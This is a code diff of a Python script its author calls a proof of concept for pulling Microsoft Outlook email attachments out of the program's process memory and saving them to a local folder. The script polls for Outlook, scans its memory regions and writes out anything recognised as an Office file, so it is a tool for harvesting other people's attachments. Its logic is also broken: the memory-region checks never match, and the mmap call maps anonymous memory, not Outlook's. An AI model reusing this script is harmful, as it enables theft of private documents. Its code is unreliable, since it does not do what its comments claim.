@@ -7,6 +7,7 @@ import win32com
 import win32con
 from magic import Magic
 import time
+import mmap
 
 # objective: proof-of-concept of a possible vulnerability in a Microsoft Outlook add-in which saves attachments to a byte-array, allowing an attacker to extract them from memory.
 
@@ -38,7 +39,6 @@ def check_for_outlook():
             print("OK, not reading process")
             pass
 
-
 def read_process(pid):
     # Get the process handle
     try:
@@ -50,34 +50,30 @@ def read_process(pid):
 
     # Iterate over the memory regions to find the Outlook data
     for region in process.memory_maps():
-        if region.is_rwx:
+        
+        if isinstance(region, mmap.mmap):
             try:
-                data = region.read()
+                with mmap.mmap(-1, length=region.size, access=mmap.ACCESS_READ, offset=region.addr) as data: # type: ignore
+                    # It checks if the data is an Office file and saves it in the Documents folder. I intend to open a Save As... window soon.
+                    magic_number = Magic()
+                    file_type = magic_number.from_buffer(data[:1024])
+                    for ext, magic_nums in file_exts.items():
+                        if file_type in magic_nums:
+                            output_file_name = f"{pid}.{ext}"
+                            with open(os.path.expandvars(f"C:\\OutlookAttachments\\{output_file_name}"), "wb") as export_file:
+                                export_file.write(data)
+                            print(f"Extraction successful: {output_file_name}")
+                            break
             except (psutil.AccessDenied, psutil.ZombieProcess):
                 print("Access denied by system")
                 continue
 
-            # It checks if the data is an Office file and saves it in the Documents folder. I intend to open a Save As... window soon.
-            magic_number = Magic()
-            file_type = magic_number.from_buffer(data[:1024])
-            for ext, magic_nums in file_exts.items():
-                if file_type in magic_nums:
-                    output_file_name = f"{pid}.{ext}"
-                    with open(os.path.expandvars(f"C:\\OutlookAttachments\\{output_file_name}"), "wb") as export_file:
-                        export_file.write(data)
-                    print(f"Extraction successful: {output_file_name}")
-                    break
-
 
 def main():
-    
     while not hasRun:
         check_for_outlook()
         time.sleep(10)
-    
-           
-
-
+        
 
 if __name__ == "__main__":
     main()
